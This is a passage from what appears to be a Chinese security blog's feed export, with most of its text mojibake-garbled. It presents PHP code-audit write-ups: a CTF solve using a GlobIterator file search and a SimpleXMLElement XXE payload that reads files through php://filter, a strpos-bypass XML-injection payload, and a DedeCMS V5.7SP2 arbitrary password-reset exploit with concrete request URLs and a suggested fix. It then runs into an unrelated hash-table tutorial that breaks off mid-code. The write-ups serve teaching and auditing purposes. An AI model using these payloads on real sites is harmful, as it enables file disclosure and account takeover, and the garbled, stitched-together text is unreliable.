å‡½æ•°ï¼Œè€Œæ˜¯ç”¨ <a href="http://php.net/manual/en/function.spl-autoload-register.php"><strong>spl_autoload_register</strong></a> æ³¨å†Œäº†ä¸€ä¸ªç±»ä¼¼ <strong>__autoload</strong> ä½œç”¨çš„å‡½æ•°ï¼Œå³è¿™é‡Œè¾“å‡º404ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œç›´æ¥åˆ©ç”¨PHPçš„å†…ç½®ç±»ï¼Œå…ˆç”¨ <strong>GlobIterator</strong> ç±»æœç´¢ <strong>flagæ–‡ä»¶</strong> åå­—ï¼Œæ¥çœ‹ä¸€ä¸‹PHPæ‰‹å†Œå¯¹ <strong>GlobIterator</strong> ç±»çš„ æ„é€ å‡½æ•°çš„å®šä¹‰ï¼š</p><blockquote><p>public <strong>GlobIterator::__construct</strong> ( string <code>$pattern</code> [, int <code>$flags</code> &#x3D; FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</p></blockquote><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æœç´¢çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé€‰æ‹©æ–‡ä»¶çš„å“ªä¸ªä¿¡æ¯ä½œä¸ºé”®åï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç”¨ <strong>FilesystemIterator::CURRENT_AS_FILEINFO</strong> ï¼Œå…¶å¯¹åº”çš„å¸¸é‡å€¼ä¸º0ï¼Œä½ å¯ä»¥åœ¨ <a href="http://php.net/manual/en/globiterator.construct.php">è¿™é‡Œ</a> æ‰¾åˆ°è¿™äº›å¸¸é‡çš„å€¼ï¼Œæ‰€ä»¥æœ€ç»ˆæœç´¢æ–‡ä»¶çš„ <strong>payload</strong> å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-24.png"><br>æˆ‘ä»¬å°†ä¼šå‘ç°flagçš„æ–‡ä»¶åä¸º <strong>f1agi3hEre.php</strong> ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨å†…ç½®ç±» <strong>SimpleXMLElement</strong> è¯»å– <strong>f1agi3hEre.php</strong> æ–‡ä»¶çš„å†…å®¹,ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ç»“åˆä½¿ç”¨PHPæµçš„ä½¿ç”¨ï¼Œå› ä¸ºå½“æ–‡ä»¶ä¸­å­˜åœ¨ï¼š <strong>&lt;   &gt;   &amp;   â€˜   â€œ</strong> è¿™5ä¸ªç¬¦å·æ—¶ï¼Œä¼šå¯¼è‡´XMLæ–‡ä»¶è§£æé”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨PHPæ–‡ä»¶æµï¼Œå°†è¦è¯»å–çš„æ–‡ä»¶å†…å®¹ç»è¿‡ <strong>base64ç¼–ç </strong> åè¾“å‡ºå³å¯ï¼Œå…·ä½“payloadå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=SimpleXMLElement&amp;param=&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;</span>&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-23.png"><br>ä¸Šé¢payloadä¸­çš„param2&#x3D;2ï¼Œå®é™…ä¸Šè¿™é‡Œ2å¯¹åº”çš„æ¨¡å¼æ˜¯ <strong>LIBXML_NOENT</strong> ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ <a href="http://php.net/manual/en/simplexmlelement.construct.php">è¿™é‡Œ</a> ã€‚</p><h2 id="False-Beard"><a href="#False-Beard" class="headerlink" title="False Beard"></a>False Beard</h2><p>é¢˜ç›®åå­—å«å‡èƒ¡å­ï¼Œä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-25.png"><br><strong>é¢˜ç›®è§£æï¼š</strong><br>æˆ‘ä»¬çœ‹åˆ° <strong>ç¬¬11è¡Œ</strong> å’Œ <strong>ç¬¬12è¡Œ</strong> ï¼Œç¨‹åºé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œä½¿ç”¨ <strong>xml</strong> ç»“æ„å­˜å‚¨ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ã€‚å®é™…ä¸Šè¿™æ ·å¾ˆå®¹æ˜“é€ æˆæ•°æ®æ³¨å…¥ã€‚ç„¶å <strong>ç¬¬21è¡Œ</strong> å®ä¾‹åŒ– <strong>Login</strong> ç±»ï¼Œå¹¶åœ¨ <strong>ç¬¬16è¡Œ</strong> å¤„è°ƒç”¨ <strong>login</strong> æ–¹æ³•è¿›è¡Œç™»é™†æ“ä½œã€‚åœ¨è¿›è¡Œç™»å½•æ“ä½œä¹‹å‰ï¼Œä»£ç åœ¨ <strong>ç¬¬8è¡Œ</strong> å’Œ <strong>ç¬¬9è¡Œ</strong> ä½¿ç”¨ <strong>strpos</strong> å‡½æ•°æ¥é˜²æ­¢è¾“å…¥çš„å‚æ•°å«æœ‰ <strong>&lt;** å’Œ **&gt;</strong> ç¬¦å·ï¼ŒçŒœæµ‹å¼€å‘è€…åº”è¯¥æ˜¯è€ƒè™‘åˆ°éæ³•å­—ç¬¦æ³¨å…¥é—®é¢˜ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ <strong>strpos</strong> å‡½æ•°çš„å®šä¹‰ï¼š</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.strpos.php">strpos</a></strong> â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®<br>ä½œç”¨ï¼šä¸»è¦æ˜¯ç”¨æ¥æŸ¥æ‰¾å­—ç¬¦åœ¨å­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚<br>ç»“æ„ï¼š<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-26.png"><br>åœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<strong>strpos</strong> å‡½æ•°è¿”å›æŸ¥æ‰¾åˆ°çš„å­å­—ç¬¦ä¸²çš„ä¸‹æ ‡ã€‚å¦‚æœå­—ç¬¦ä¸²å¼€å¤´å°±æ˜¯æˆ‘ä»¬è¦æœç´¢çš„ç›®æ ‡ï¼Œåˆ™è¿”å›ä¸‹æ ‡ <strong>0</strong> ï¼›å¦‚æœæœç´¢ä¸åˆ°ï¼Œåˆ™è¿”å› <strong>false</strong> ã€‚åœ¨è¿™é“é¢˜ç›®ä¸­ï¼Œå¼€å‘è€…åªè€ƒè™‘åˆ° <strong>strpos</strong> å‡½æ•°è¿”å› <strong>false</strong> çš„æƒ…å†µï¼Œå´å¿½ç•¥äº†åŒ¹é…åˆ°çš„å­—ç¬¦åœ¨é¦–ä½æ—¶ä¼šè¿”å› <strong>0</strong> çš„æƒ…å†µï¼Œå› ä¸º <strong>false</strong> å’Œ <strong>0</strong> çš„å–åå‡ä¸º <strong>true</strong> ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ç”¨æˆ·åå’Œå¯†ç é¦–å­—ç¬¦æ³¨å…¥ <strong>&lt;</strong> ç¬¦å·ï¼Œä»è€Œæ³¨å…¥xmlæ•°æ®ã€‚æˆ‘ä»¬å°è¯•ä½¿ç”¨ä»¥ä¸‹ <strong>payload</strong> ï¼Œè§‚å¯Ÿ <strong>strpos</strong> å‡½æ•°çš„è¿”å›ç»“æœã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&lt;<span class="string">&quot;&gt;&lt;injected-tag%20property=&quot;</span>&amp;pass=&lt;injected-tag&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-27.png"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆæ˜æ˜¾æ˜¯å¯ä»¥æ³¨å…¥xmlæ•°æ®çš„ã€‚</p><h3 id="å®ä¾‹åˆ†æ-2"><a href="#å®ä¾‹åˆ†æ-2" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>å®é™…ä¸Šï¼Œæœ¬æ¬¡æ¼æ´æ˜¯å¼€å‘è€…å¯¹ <strong>strpos</strong> å‡½æ•°ç†è§£ä¸å¤Ÿï¼Œæˆ–è€…è¯´æ˜¯å¼€å‘è€…è€ƒè™‘ä¸å‘¨ï¼Œå¯¼è‡´è¿‡æ»¤æ–¹æ³•å¯è¢«ç»•è¿‡ã€‚ç”±äºæˆ‘ä»¬æš‚æ—¶æ²¡æœ‰åœ¨äº’è”ç½‘ä¸Šæ‰¾åˆ° <strong>strpos</strong> ä½¿ç”¨ä¸å½“å¯¼è‡´æ¼æ´çš„CMSæ¡ˆä¾‹ï¼Œæ‰€ä»¥è¿™é‡Œåªèƒ½é€‰å–ä¸€ä¸ªç›¸ä¼¼çš„æ¼æ´è¿›è¡Œåˆ†æï¼ŒåŒæ ·æ˜¯å¼€å‘è€…éªŒè¯ä¸å¤Ÿå‘¨å…¨å¯¼è‡´çš„æ¼æ´ã€‚<br>æœ¬æ¬¡æ¡ˆä¾‹ï¼Œæˆ‘ä»¬é€‰å– <strong>DeDecms V5.7SP2æ­£å¼ç‰ˆ</strong> è¿›è¡Œåˆ†æï¼Œè¯¥CMSå­˜åœ¨æœªä¿®å¤çš„ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®æ¼æ´ã€‚æ¼æ´çš„è§¦å‘ç‚¹åœ¨ <strong>member&#x2F;resetpassword.php</strong> æ–‡ä»¶ä¸­ï¼Œç”±äºå¯¹æ¥æ”¶çš„å‚æ•° <strong>safeanswer</strong> æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„ç±»å‹åˆ¤æ–­ï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³ä»£ç ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-28.png"><br>é’ˆå¯¹ä¸Šé¢çš„ä»£ç åšä¸ªåˆ†æï¼Œå½“ <strong>$dopost</strong> ç­‰äº <strong>safequestion</strong> çš„æ—¶å€™ï¼Œé€šè¿‡ä¼ å…¥çš„ <strong>$mid</strong> å¯¹åº”çš„ <strong>id</strong> å€¼æ¥æŸ¥è¯¢å¯¹åº”ç”¨æˆ·çš„å®‰å…¨é—®é¢˜ã€å®‰å…¨ç­”æ¡ˆã€ç”¨æˆ·idã€ç”µå­é‚®ä»¶ç­‰ä¿¡æ¯ã€‚è·Ÿè¿›åˆ° <strong>ç¬¬11è¡Œ</strong> ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„é—®é¢˜å’Œç­”æ¡ˆéç©ºï¼Œè€Œä¸”ç­‰äºä¹‹å‰è®¾ç½®çš„é—®é¢˜å’Œç­”æ¡ˆï¼Œåˆ™è¿›å…¥ <strong>sn</strong> å‡½æ•°ã€‚ç„¶è€Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ <strong>&#x3D;&#x3D;</strong> è€Œä¸æ˜¯ <strong>&#x3D;&#x3D;&#x3D;</strong> æ¥åˆ¤æ–­ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ç»•è¿‡çš„ã€‚å‡è®¾ç”¨æˆ·æ²¡æœ‰è®¾ç½®å®‰å…¨é—®é¢˜å’Œç­”æ¡ˆï¼Œé‚£ä¹ˆé»˜è®¤æƒ…å†µä¸‹å®‰å…¨é—®é¢˜çš„å€¼ä¸º <strong>0</strong> ï¼Œç­”æ¡ˆçš„å€¼ä¸º <strong>null</strong> ï¼ˆè¿™é‡Œæ˜¯æ•°æ®åº“ä¸­çš„å€¼ï¼Œå³ <strong>$row[â€˜safequestionâ€™]&#x3D;â€0â€</strong> ã€ <strong>$row[â€˜safeanswerâ€™]&#x3D;null</strong> ï¼‰ã€‚å½“æ²¡æœ‰è®¾ç½® <strong>safequestion</strong> å’Œ <strong>safeanswer</strong> çš„å€¼æ—¶ï¼Œå®ƒä»¬çš„å€¼å‡ä¸ºç©ºå­—ç¬¦ä¸²ã€‚ç¬¬11è¡Œçš„ifè¡¨è¾¾å¼ä¹Ÿå°±å˜æˆäº† <strong>if(â€˜0â€™ &#x3D;&#x3D; â€˜â€™ &amp;&amp; null &#x3D;&#x3D; â€˜â€™)</strong> ï¼Œå³ <strong>if(false &amp;&amp; true)</strong> ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦è®©è¡¨è¾¾å¼ <strong>$row[â€˜safequestionâ€™] &#x3D;&#x3D; $safequestion</strong> ä¸º <strong>true</strong> å³å¯ã€‚ä¸‹å›¾æ˜¯ <strong>null &#x3D;&#x3D; â€˜â€™</strong> çš„åˆ¤æ–­ç»“æœï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-30.png"><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <strong>phpå¼±ç±»å‹</strong> çš„ç‰¹ç‚¹ï¼Œæ¥ç»•è¿‡è¿™é‡Œ <strong>$row[â€˜safequestionâ€™] &#x3D;&#x3D; $safequestion</strong> çš„åˆ¤æ–­ï¼Œå¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-31.png"><br>é€šè¿‡æµ‹è¯•æ‰¾åˆ°äº†ä¸‰ä¸ªçš„payloadï¼Œåˆ†åˆ«æ˜¯ <strong>0.0</strong> ã€ <strong>0.</strong> ã€ <strong>0e1</strong> ï¼Œè¿™ä¸‰ç§ç±»å‹payloadå‡èƒ½ä½¿å¾— <strong>$row[â€˜safequestionâ€™] &#x3D;&#x3D; $safequestion</strong>  ä¸º <strong>true</strong> ï¼Œå³æˆåŠŸè¿›å…¥ <strong>sn</strong> å‡½æ•°ã€‚è·Ÿè¿› <strong>sn</strong> å‡½æ•°ï¼Œç›¸å…³ä»£ç åœ¨ <strong>member&#x2F;inc&#x2F;inc_pwd_functions.php</strong> æ–‡ä»¶ä¸­ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-32.png"><br>åœ¨ <strong>sn</strong> å‡½æ•°å†…éƒ¨ï¼Œä¼šæ ¹æ®idåˆ°pwd_tmpè¡¨ä¸­åˆ¤æ–­æ˜¯å¦å­˜åœ¨å¯¹åº”çš„ä¸´æ—¶å¯†ç è®°å½•ï¼Œæ ¹æ®ç»“æœç¡®å®šåˆ†æ”¯ï¼Œèµ°å‘ <strong>newmail</strong> å‡½æ•°ã€‚å‡è®¾å½“å‰æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¿›è¡Œå¿˜è®°å¯†ç æ“ä½œï¼Œé‚£ä¹ˆæ­¤æ—¶çš„ <strong>$row</strong> åº”è¯¥ä¸ºç©ºï¼Œæ‰€ä»¥è¿›å…¥ç¬¬ä¸€ä¸ª <strong>if(!is_array($row))</strong> åˆ†æ”¯ï¼Œåœ¨ <strong>newmail</strong> å‡½æ•°ä¸­æ‰§è¡Œ <strong>INSERT</strong> æ“ä½œï¼Œç›¸å…³æ“ä½œä»£ç ä½ç½®åœ¨ <strong>member&#x2F;inc&#x2F;inc_pwd_functions.php</strong> æ–‡ä»¶ä¸­ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-33.png"><br>è¯¥ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯å‘é€é‚®ä»¶è‡³ç›¸å…³é‚®ç®±ï¼Œå¹¶ä¸”æ’å…¥ä¸€æ¡è®°å½•è‡³ <strong>dede_pwd_tmp</strong> è¡¨ä¸­ã€‚è€Œæ°å¥½æ¼æ´çš„è§¦å‘ç‚¹å°±åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬çœ‹çœ‹ <strong>ç¬¬13è¡Œ</strong> è‡³ <strong>ç¬¬18è¡Œ</strong> çš„ä»£ç ï¼Œå¦‚æœ <strong>($send &#x3D;&#x3D; â€˜Nâ€™)</strong> è¿™ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œé€šè¿‡ <strong>ShowMsg</strong> æ‰“å°å‡ºä¿®æ”¹å¯†ç åŠŸèƒ½çš„é“¾æ¥ã€‚ <strong>ç¬¬17è¡Œ</strong> ä¿®æ”¹å¯†ç é“¾æ¥ä¸­çš„ <strong>$mid</strong> å‚æ•°å¯¹åº”çš„å€¼æ˜¯ç”¨æˆ·idï¼Œè€Œ <strong>$randval</strong> æ˜¯åœ¨ç¬¬ä¸€æ¬¡ <strong>insert</strong> æ“ä½œçš„æ—¶å€™å°†å…¶ <strong>md5</strong> åŠ å¯†ä¹‹åæ’å…¥åˆ° <strong>dede_pwd_tmp</strong> è¡¨ä¸­ï¼Œå¹¶ä¸”åœ¨è¿™é‡Œå·²ç»ç›´æ¥å›æ˜¾ç»™ç”¨æˆ·ã€‚é‚£ä¹ˆè¿™é‡Œæ‹¼æ¥çš„urlå…¶å®æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/member/resetpassword.php?dopost=getpasswd&amp;id=$mid&amp;key=$randval</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›ä¸€ä¸‹ <strong>dopost&#x3D;getpasswd</strong> çš„æ“ä½œï¼Œç›¸å…³ä»£ç ä½ç½®åœ¨ <strong>member&#x2F;resetpassword.php</strong> ä¸­ï¼Œ<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-34.png"><br>åœ¨é‡ç½®å¯†ç çš„æ—¶å€™åˆ¤æ–­è¾“å…¥çš„ç”¨æˆ·idæ˜¯å¦æ‰§è¡Œè¿‡é‡ç½®å¯†ç ï¼Œå¦‚æœidä¸ºç©ºåˆ™é€€å‡ºï¼›å¦‚æœ <strong>$row</strong> ä¸ä¸ºç©ºï¼Œåˆ™ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œå†…å®¹ï¼Œç›¸å…³ä»£ç åœ¨ <strong>member&#x2F;resetpassword.php</strong> ä¸­ã€‚<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-36.png"><br>ä¸Šå›¾ä»£ç ä¼šå…ˆåˆ¤æ–­æ˜¯å¦è¶…æ—¶ï¼Œå¦‚æœæ²¡æœ‰è¶…æ—¶ï¼Œåˆ™è¿›å…¥å¯†ç ä¿®æ”¹é¡µé¢ã€‚åœ¨å¯†ç ä¿®æ”¹é¡µé¢ä¼šå°† <strong>$setp</strong> èµ‹å€¼ä¸º2ã€‚<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-37.png"><br>ç”±äºç°åœ¨çš„æ•°æ®åŒ…ä¸­ <strong>$setp&#x3D;2</strong> ï¼Œå› æ­¤è¿™éƒ¨åˆ†åŠŸèƒ½ä»£ç å®ç°åˆå›åˆ°äº† <strong>member&#x2F;resetpassword.php</strong> æ–‡ä»¶ä¸­ã€‚<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-38.png"><br>ä¸Šå›¾ä»£ç  <strong>ç¬¬6è¡Œ</strong> åˆ¤æ–­ä¼ å…¥çš„ <strong>$key</strong> æ˜¯å¦ç­‰äºæ•°æ®åº“ä¸­çš„ <strong>$row[â€˜pwdâ€™]</strong> ï¼Œå¦‚æœç›¸ç­‰å°±å®Œæˆé‡ç½®å¯†ç æ“ä½œï¼Œè‡³æ­¤ä¹Ÿå°±å®Œæˆäº†æ•´ä¸ªæ”»å‡»çš„åˆ†æè¿‡ç¨‹ã€‚</p><h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><p>æˆ‘ä»¬åˆ†åˆ«æ³¨å†Œ <strong>test1</strong> ï¼Œ <strong>test2</strong> ä¸¤ä¸ªè´¦å·<br>ç¬¬ä¸€æ­¥è®¿é—® <strong>payload</strong> ä¸­çš„ <strong>url</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedecms/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;<span class="built_in">id</span>=9</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <strong>test2</strong> çš„idæ˜¯9<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-39.png"><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-40.png"><br>é€šè¿‡æŠ“åŒ…è·å–åˆ° <strong>key</strong> å€¼ã€‚<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-41.png"><br>å»æ‰å¤šä½™çš„å­—ç¬¦è®¿é—®ä¿®æ”¹å¯†ç é“¾æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.240/dedecms/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=OTyEGJtg</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-42.png"><br>æœ€åæˆåŠŸä¿®æ”¹å¯†ç ï¼Œæˆ‘å°†å¯†ç ä¿®æ”¹æˆ <strong>123456</strong> ï¼Œæ•°æ®åº“ä¸­ <strong>test2</strong> çš„å¯†ç å­—æ®µä¹Ÿå˜æˆäº† <strong>123456</strong> åŠ å¯†ä¹‹åçš„å€¼ã€‚<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-43.png"></p><h3 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>é’ˆå¯¹ä¸Šé¢ <strong>DeDecmsä»»æ„ç”¨æˆ·å¯†ç é‡ç½®</strong> æ¼æ´ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ <strong>&#x3D;&#x3D;&#x3D;</strong> æ¥ä»£æ›¿ <strong>&#x3D;&#x3D;</strong> å°±è¡Œäº†ã€‚å› ä¸º <strong>&#x3D;&#x3D;&#x3D;</strong> æ“ä½œä¼šåŒæ—¶åˆ¤æ–­å·¦å³ä¸¤è¾¹çš„å€¼å’Œæ•°æ®ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œè‹¥æœ‰ä¸€ä¸ªä¸ç­‰ï¼Œå³è¿”å› <strong>false</strong> ã€‚å…·ä½“ä¿®å¤ä»£ç å¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-44.png"></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘å“ˆå¸Œ</title>
      <link href="/2024/09/30/algorithm/hash/"/>
      <url>/2024/09/30/algorithm/hash/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>ä¸€èˆ¬å“ˆå¸Œè¡¨éƒ½æ˜¯ç”¨æ¥å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦å‡ºç°é›†åˆé‡Œã€‚è¦æšä¸¾çš„è¯æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ï¼Œä½†å¦‚æœä½¿ç”¨å“ˆå¸Œè¡¨çš„è¯ï¼Œ åªéœ€è¦O(1)å°±å¯ä»¥åšåˆ°ã€‚å°†å­¦ç”Ÿå§“åæ˜ å°„åˆ°å“ˆå¸Œè¡¨ä¸Šå°±æ¶‰åŠåˆ°äº†hash function ï¼Œä¹Ÿå°±æ˜¯å“ˆå¸Œå‡½æ•°ã€‚<br><img src="/2024/09/30/algorithm/hash/image.png"><br>å¦‚æœå­¦ç”Ÿçš„æ•°é‡å¤§äºå“ˆå¸Œè¡¨çš„å¤§å°æ€ä¹ˆåŠï¼Œæ­¤æ—¶å°±ç®—å“ˆå¸Œå‡½æ•°è®¡ç®—çš„å†å‡åŒ€ï¼Œä¹Ÿé¿å…ä¸äº†ä¼šæœ‰å‡ ä½å­¦ç”Ÿçš„åå­—åŒæ—¶æ˜ å°„åˆ°å“ˆå¸Œè¡¨ åŒä¸€ä¸ªç´¢å¼•ä¸‹æ ‡çš„ä½ç½®ã€‚</p><p>æ¥ä¸‹æ¥å“ˆå¸Œç¢°æ’ç™»åœº<br>æ‹‰é“¾æ³•ï¼šæ‹‰é“¾æ³•å°±æ˜¯è¦é€‰æ‹©é€‚å½“çš„å“ˆå¸Œè¡¨çš„å¤§å°ï¼Œè¿™æ ·æ—¢ä¸ä¼šå› ä¸ºæ•°ç»„ç©ºå€¼è€Œæµªè´¹å¤§é‡å†…å­˜ï¼Œä¹Ÿä¸ä¼šå› ä¸ºé“¾è¡¨å¤ªé•¿è€Œåœ¨æŸ¥æ‰¾ä¸Šæµªè´¹å¤ªå¤šæ—¶é—´ã€‚<br><img src="/2024/09/30/algorithm/hash/image-1.png"><br>çº¿æ€§æ¢æµ‹æ³•ï¼šä½¿ç”¨çº¿æ€§æ¢æµ‹æ³•ï¼Œä¸€å®šè¦ä¿è¯tableSizeå¤§äºdataSizeã€‚ æˆ‘ä»¬éœ€è¦ä¾é å“ˆå¸Œè¡¨ä¸­çš„ç©ºä½æ¥è§£å†³ç¢°æ’é—®é¢˜ã€‚ä¾‹å¦‚å†²çªçš„ä½ç½®ï¼Œæ”¾äº†å°æï¼Œé‚£ä¹ˆå°±å‘ä¸‹æ‰¾ä¸€ä¸ªç©ºä½æ”¾ç½®å°ç‹çš„ä¿¡æ¯ã€‚æ‰€ä»¥è¦æ±‚tableSizeä¸€å®šè¦å¤§äºdataSize ï¼Œè¦ä¸ç„¶å“ˆå¸Œè¡¨ä¸Šå°±æ²¡æœ‰ç©ºç½®çš„ä½ç½®æ¥å­˜æ”¾ å†²çªçš„æ•°æ®äº†ã€‚<br><img src="/2024/09/30/algorithm/hash/image-2.png"></p><p>å½“æˆ‘ä»¬æƒ³ä½¿ç”¨å“ˆå¸Œæ³•æ¥è§£å†³é—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šé€‰æ‹©å¦‚ä¸‹ä¸‰ç§æ•°æ®ç»“æ„ã€‚</p><ul><li>æ•°ç»„</li><li>set ï¼ˆé›†åˆï¼‰</li><li>map(æ˜ å°„)<br>å½“æˆ‘ä»¬é‡åˆ°äº†è¦å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦å‡ºç°é›†åˆé‡Œçš„æ—¶å€™ï¼Œå°±è¦è€ƒè™‘å“ˆå¸Œæ³•ã€‚ä½†æ˜¯å“ˆå¸Œæ³•ä¹Ÿæ˜¯ç‰ºç‰²äº†ç©ºé—´æ¢å–äº†æ—¶é—´ï¼Œå› ä¸ºæˆ‘ä»¬è¦ä½¿ç”¨é¢å¤–çš„æ•°ç»„ï¼Œsetæˆ–è€…æ˜¯mapæ¥å­˜æ”¾æ•°æ®ï¼Œæ‰èƒ½å®ç°å¿«é€Ÿçš„æŸ¥æ‰¾ã€‚å¦‚æœåœ¨åšé¢è¯•é¢˜ç›®çš„æ—¶å€™é‡åˆ°éœ€è¦åˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦å‡ºç°è¿‡çš„åœºæ™¯ä¹Ÿåº”è¯¥ç¬¬ä¸€æ—¶é—´æƒ³åˆ°å“ˆå¸Œæ³•ï¼</li></ul><ol><li><p>æ£€æµ‹æ•°ç»„ä¸­çš„é‡å¤å…ƒç´ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">containsDuplicate</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!set.add(num)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// å¦‚æœæ·»åŠ å¤±è´¥ï¼Œè¯´æ˜å…ƒç´ 